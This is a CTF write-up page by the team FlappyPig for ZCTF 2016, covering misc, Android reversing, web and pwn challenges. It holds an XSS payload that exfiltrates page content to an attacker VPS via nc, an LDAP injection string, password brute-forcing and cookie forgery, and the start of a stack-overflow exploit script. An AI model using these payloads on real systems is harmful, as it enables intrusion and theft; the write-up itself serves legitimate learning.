<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>ZCTF Writeup - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="author:FlappyPig" />
<meta name="keywords" content="com.zctf.app,Easy Injection,FlappyPig,gdb dump,ldap注入,Reverese100,reverse,stegsolve,xctf 竞赛规则,ZCTF,zctf writeup,zctf{Notthis}" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/42334.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-42334 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive">独家</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup" rel="category tag">CTF</a> &gt;  正文 </nav><article id="post-42334" class="post-42334 post type-post status-publish format-standard has-post-thumbnail hentry category-ctf-writeup tag-com-zctf-app tag-easy-injection tag-flappypig tag-gdb-dump tag-ldap tag-reverese100 tag-reverse tag-stegsolve tag-xctf- tag-zctf tag-zctf-writeup tag-zctfnotthis">
	<header class="single-header">
		<h1>ZCTF Writeup</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2016 /1/26 12:50</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">8,526</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/42334.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<p><strong>author:FlappyPig</strong></p>
<h2><strong>MISC</strong></h2>
<h3><span style="color: #ff6600;">xctf 竞赛规则</span></h3>
<pre>XCTF.docx-ca626bea35779f5f7032e00cf9d2dd02
宽窄间距
也许你需要懂宏编程
</pre>
<p>这个题的脑洞 简直。。。</p>
<p>主要看spacing    可以看到3种间距  -2 0 2     于是推算 -2和2的时候</p>
<p>一个烫=一个0或者一个1</p>
<p><a href="http://p0.qhimg.com/t014cc92b08fef20d4b.png" target="_blank"><img title="t014cc92b08fef20d4b.png" src="http://p0.qhimg.com/t014cc92b08fef20d4b.png" alt="http://p0.qhimg.com/t014cc92b08fef20d4b.png" /></a></p>
<p>猜测开头</p>
<p><a href="http://p8.qhimg.com/t01d1935e6f3e2a0720.png" target="_blank"><img title="t01d1935e6f3e2a0720.png" src="http://p8.qhimg.com/t01d1935e6f3e2a0720.png" alt="http://p8.qhimg.com/t01d1935e6f3e2a0720.png" /></a></p>
<p>发现完全吻合之后 把所有168个烫都转换为二进制  最后8个二进制输出一个字符</p>
<p>得到flag</p>
<p><a href="http://p7.qhimg.com/t016d7f949eaa97d8d3.png" target="_blank"><img title="t016d7f949eaa97d8d3.png" src="http://p7.qhimg.com/t016d7f949eaa97d8d3.png" alt="http://p7.qhimg.com/t016d7f949eaa97d8d3.png" /></a></p>
<p>ZCTF{C0nnE_ON_B4BUj!}</p>
<p>&nbsp;</p>
<h3><span style="color: #ff6600;">码魂</span></h3>
<pre>100
0 solves
zctf.4454351239294142517768106477424758339313668330551556598850285899498383133918517502503116443893032458144900690532957411308317691675682333946019971994909066641891914657728311161476294251777002804869680310833062416097160633225722907877609055897813420047521712976274014308415290941783823683328734523657720186652742880094528490554601943311421553698477475972304302075922033331292552372389282466264842199
</pre>
<p>&nbsp;</p>
<h3><span style="color: #ff6600;">小绿和小蓝</span></h3>
<pre>漫画
zctf is the key game!
Des key is 8 bytes
dashi.jpg-ddb46459b4f8e82a80a720bde3c98bf6
</pre>
<h3><span style="color: #ff6600;">风雨过后</span></h3>
<pre>300
0 solves

115.28.206.86 2016
</pre>
<p>&nbsp;</p>
<h3><span style="color: #ff6600;"><strong>Android200</strong></span></h3>
<p>首先出现的是登陆窗口,检查登录名密码的函数在这里</p>
<p><a href="http://p8.qhimg.com/t01a594be79b1222c61.png" target="_blank"><img title="t01a594be79b1222c61.png" src="http://p8.qhimg.com/t01a594be79b1222c61.png" alt="http://p8.qhimg.com/t01a594be79b1222c61.png" /></a></p>
<p>使用Auth.auth函数验证用户名密码,this.databaseopt()函数获得加密用的密钥,该函数如下图,大概是从key.db中获取密钥</p>
<p><a href="http://p3.qhimg.com/t01457e11b3b7bd129b.png" target="_blank"><img title="t01457e11b3b7bd129b.png" src="http://p3.qhimg.com/t01457e11b3b7bd129b.png" alt="http://p3.qhimg.com/t01457e11b3b7bd129b.png" /></a></p>
<p>下个log直接把key打印出来,是zctf{Notthis},因此用户名是zctf,密码应该是{Notthis}。</p>
<p>这一步通过了之后会运行app这个类,里面会检查反调试,并且设置了退出时间,把相应退出的转跳判断改掉就不会退出了。最后程序会调用JNIclass.sayHelloInc</p>
<p><a href="http://p0.qhimg.com/t017d21266df0cf15a4.png" target="_blank"><img title="t017d21266df0cf15a4.png" src="http://p0.qhimg.com/t017d21266df0cf15a4.png" alt="http://p0.qhimg.com/t017d21266df0cf15a4.png" /></a></p>
<p>用ida查看相关汇编</p>
<p>其中会调用Java_com_zctf_app_JNIclass_add_0()查看/proc/pid/status进行反调试,调试的时候把它的返回值改为0,即可绕过。</p>
<p><a href="http://p2.qhimg.com/t01178669b11892f526.png" target="_blank"><img title="t01178669b11892f526.png" src="http://p2.qhimg.com/t01178669b11892f526.png" alt="http://p2.qhimg.com/t01178669b11892f526.png" /></a></p>
<p>剩下的部分貌似是拼接/data/data/com.zctf.app/files/bottom和so文件内部的一个字符串,然后使用des解密。</p>
<p><a href="http://p7.qhimg.com/t01cba0457758262edf.png" target="_blank"><img title="t01cba0457758262edf.png" src="http://p7.qhimg.com/t01cba0457758262edf.png" alt="http://p7.qhimg.com/t01cba0457758262edf.png" /></a></p>
<p>这里直接用gdb dump出解密后的值即可,是一张图片。用stegsolve打开即可看到flag。</p>
<p><a href="http://p3.qhimg.com/t019ecefa5414525c98.png" target="_blank"><img title="t019ecefa5414525c98.png" src="http://p3.qhimg.com/t019ecefa5414525c98.png" alt="http://p3.qhimg.com/t019ecefa5414525c98.png" /></a></p>
<p><a href="http://p5.qhimg.com/t0110956fbe9bc90c63.png" target="_blank"><img title="t0110956fbe9bc90c63.png" src="http://p5.qhimg.com/t0110956fbe9bc90c63.png" alt="http://p5.qhimg.com/t0110956fbe9bc90c63.png" /></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2><strong>WEB</strong></h2>
<h3><span style="color: #ff6600;">Web150 Easy Injection</span></h3>
<p>一个登录框..测试了下感觉不像注入,cookie中有个sessionhint,发现是base32编码,解码发现是说不是sql注入,</p>
<p>扫 了下端口,发现存在389端口,ldap,参考drops的文章,用admin/*登录进后台,发现一个搜索,搜索a回显,0 admin, (| (uid=*a*))猜测是后端的语句,这里又有一个sessionhint解出来can you find my description,后来才发现 description是表名,于是根据drops文章一位一位盲注出。</p>
<p>payload:search=b*)(description=z</p>
<p><a href="http://p1.qhimg.com/t018d6124e00234e068.png" target="_blank"><img title="t018d6124e00234e068.png" src="http://p1.qhimg.com/t018d6124e00234e068.png" alt="http://p1.qhimg.com/t018d6124e00234e068.png" /></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h3><span style="color: #ff6600;">Web200 加密的帖子</span></h3>
<p>没啥好说的这题..你以为你换个DedeCMS的Logo我就认不出你是Discuz了么!</p>
<p>XSS漏洞,wooyun上有,在回复帖子的位置插入代码:</p>
<p>[flash]http://VPS_IP:9997/flash.swf?'+btoa(escape(document.body.innerHTML))+'[/flash]</p>
<p>VPS上nc监听9997端口,就能接收到数据了..</p>
<p><a href="http://p9.qhimg.com/t01aafdcfec7754f049.png" target="_blank"><img title="t01aafdcfec7754f049.png" src="http://p9.qhimg.com/t01aafdcfec7754f049.png" alt="http://p9.qhimg.com/t01aafdcfec7754f049.png" /></a></p>
<p>解码之后就能看到flag</p>
<p><a href="http://p3.qhimg.com/t016d3f0f0b0901b222.png" target="_blank"><img title="t016d3f0f0b0901b222.png" src="http://p3.qhimg.com/t016d3f0f0b0901b222.png" alt="http://p3.qhimg.com/t016d3f0f0b0901b222.png" /></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h3><span style="color: #ff6600;">老大知道flag</span></h3>
<p>首先爆破常用姓名  最后可以登录zhangwei 123456</p>
<p>登录上去之后发现通讯录  还有md5过的cookie  解不开</p>
<p><a href="http://p2.qhimg.com/t01147fc63c5ea79ac0.png" target="_blank"><img title="t01147fc63c5ea79ac0.png" src="http://p2.qhimg.com/t01147fc63c5ea79ac0.png" alt="http://p2.qhimg.com/t01147fc63c5ea79ac0.png" /></a></p>
<p>然后爆破通讯录里的弱口令</p>
<p>可以得到 niubenben  123456789</p>
<p>继续登录 发现cookie可以解  解完之后是 9+ADk-</p>
<p>可以推算老大 是1+xxxx    最后尝试多次发现+ADk- 是utf-7的编码</p>
<p>于是构造老大的cookie</p>
<p><a href="http://p3.qhimg.com/t01261c22110032acba.png" target="_blank"><img title="t01261c22110032acba.png" src="http://p3.qhimg.com/t01261c22110032acba.png" alt="http://p3.qhimg.com/t01261c22110032acba.png" /></a></p>
<p>再md5下   用burp发包 拿到flag</p>
<p><a href="http://p4.qhimg.com/t0133e31ecac4f1f7f4.png" target="_blank"><img title="t0133e31ecac4f1f7f4.png" src="http://p4.qhimg.com/t0133e31ecac4f1f7f4.png" alt="http://p4.qhimg.com/t0133e31ecac4f1f7f4.png" /></a></p>
<h2><strong>PWN</strong></h2>
<h3><span style="color: #ff6600;">guess(pwn100):</span></h3>
<p>题目逻辑比较简单,gets的缓冲区是栈上的,可以任意长度读入,而栈的缓冲区长度是40。如下:</p>
<p><a href="http://p2.qhimg.com/t01d1930333f78b9bbe.png" target="_blank"><img title="t01d1930333f78b9bbe.png" src="http://p2.qhimg.com/t01d1930333f78b9bbe.png" alt="http://p2.qhimg.com/t01d1930333f78b9bbe.png" /></a></p>
<p>由于直接与flag相比较,所以这里flag是存在于内存中的。由于做了限制,必须以ZCTF{开头,而且长度一定,所以这里首先得暴力长度,根据返回的结果判断长度是否正确。</p>
<p>长度开始为33,后来改为34。</p>
<p>由 于栈的前面存在有主函数main(int argc, char** argv)的参数值,而这个参数argv[0]即为程序的名字,在异常时会显示在错 误信息后面,所以只要覆盖栈中argv[0]的地址为特定地址就可以达到任意地址泄露。所以可以泄露原flag的信息。</p>
<p>由 于::s(flag存放的地址)最后会与输入值做异或,所以最后只要反异或就可以。由于开始的时候ZCTF{这个地方异或后肯定为0,所以打印的时候,地 址应该往后靠点:如+5,另外选取的异或数也可能余flag中的相同,存在0截断,所以可以多打印些地址,这里直接选用‘b’,发现能够全部泄露出来(第五个5以后的)。</p>
<p>利用代码如下:</p>
<table class="syntaxhighlighter  python" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
<div class="line number7 index6 alt2">7</div>
<div class="line number8 index7 alt1">8</div>
<div class="line number9 index8 alt2">9</div>
<div class="line number10 index9 alt1">10</div>
<div class="line number11 index10 alt2">11</div>
<div class="line number12 index11 alt1">12</div>
<div class="line number13 index12 alt2">13</div>
<div class="line number14 index13 alt1">14</div>
<div class="line number15 index14 alt2">15</div>
<div class="line number16 index15 alt1">16</div>
<div class="line number17 index16 alt2">17</div>
<div class="line number18 index17 alt1">18</div>
<div class="line number19 index18 alt2">19</div>
<div class="line number20 index19 alt1">20</div>
<div class="line number21 index20 alt2">21</div>
<div class="line number22 index21 alt1">22</div>
<div class="line number23 index22 alt2">23</div>
<div class="line number24 index23 alt1">24</div>
<div class="line number25 index24 alt2">25</div>
<div class="line number26 index25 alt1">26</div>
<div class="line number27 index26 alt2">27</div>
<div class="line number28 index27 alt1">28</div>
<div class="line number29 index28 alt2">29</div>
<div class="line number30 index29 alt1">30</div>
<div class="line number31 index30 alt2">31</div>
<div class="line number32 index31 alt1">32</div>
<div class="line number33 index32 alt2">33</div>
<div class="line number34 index33 alt1">34</div>
<div class="line number35 index34 alt2">35</div>
<div class="line number36 index35 alt1">36</div>
<div class="line number37 index36 alt2">37</div>
<div class="line number38 index37 alt1">38</div>
<div class="line number39 index38 alt2">39</div>
<div class="line number40 index39 alt1">40</div>
<div class="line number41 index40 alt2">41</div>
<div class="line number42 index41 alt1">42</div>
<div class="line number43 index42 alt2">43</div>
<div class="line number44 index43 alt1">44</div>
<div class="line number45 index44 alt2">45</div>
<div class="line number46 index45 alt1">46</div>
<div class="line number47 index46 alt2">47</div>
<div class="line number48 index47 alt1">48</div>
<div class="line number49 index48 alt2">49</div>
<div class="line number50 index49 alt1">50</div>
<div class="line number51 index50 alt2">51</div>
<div class="line number52 index51 alt1">52</div>
<div class="line number53 index52 alt2">53</div>
<div class="line number54 index53 alt1">54</div>
<div class="line number55 index54 alt2">55</div>
<div class="line number56 index55 alt1">56</div>
<div class="line number57 index56 alt2">57</div>
<div class="line number58 index57 alt1">58</div>
<div class="line number59 index58 alt2">59</div>
<div class="line number60 index59 alt1">60</div>
<div class="line number61 index60 alt2">61</div>
<div class="line number62 index61 alt1">62</div>
<div class="line number63 index62 alt2">63</div>
<div class="line number64 index63 alt1">64</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python plain">__author__ </code><code class="python keyword">=</code> <code class="python string">"pxx"</code></div>
<div class="line number2 index1 alt1"><code class="python comments">#from zio import *</code></div>
<div class="line number3 index2 alt2"><code class="python keyword">from</code> <code class="python plain">pwn </code><code class="python keyword">import</code> <code class="python keyword">*</code></div>
<div class="line number4 index3 alt1"><code class="python comments">#target = "./guess"</code></div>
<div class="line number5 index4 alt2"><code class="python plain">target </code><code class="python keyword">=</code> <code class="python plain">(</code><code class="python string">"115.28.27.103"</code><code class="python plain">, </code><code class="python value">22222</code><code class="python plain">)</code></div>
<div class="line number6 index5 alt1"><code class="python keyword">def</code> <code class="python plain">get_io(target):</code></div>
<div class="line number7 index6 alt2"><code class="python comments">#r_m = COLORED(RAW, "green")</code></div>
<div class="line number8 index7 alt1"><code class="python comments">#w_m = COLORED(RAW, "blue")</code></div>
<div class="line number9 index8 alt2"><code class="python comments">#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)</code></div>
<div class="line number10 index9 alt1"><code class="python comments">#io = process(target, timeout = 9999)</code></div>
<div class="line number11 index10 alt2"><code class="python plain">io </code><code class="python keyword">=</code> <code class="python plain">remote(</code><code class="python string">"115.28.27.103"</code><code class="python plain">, </code><code class="python value">22222</code><code class="python plain">, timeout </code><code class="python keyword">=</code> <code class="python value">9999</code><code class="python plain">)</code></div>
<div class="line number12 index11 alt1"><code class="python keyword">return</code>  <code class="python plain">io </code></div>
<div class="line number13 index12 alt2"><code class="python keyword">def</code> <code class="python plain">leak_len(io, length):</code></div>
<div class="line number14 index13 alt1"><code class="python plain">io.readuntil(</code><code class="python string">"please guess the flag:\n"</code><code class="python plain">)</code></div>
<div class="line number15 index14 alt2"><code class="python plain">flag_addr </code><code class="python keyword">=</code> <code class="python value">0x6010C0</code></div>
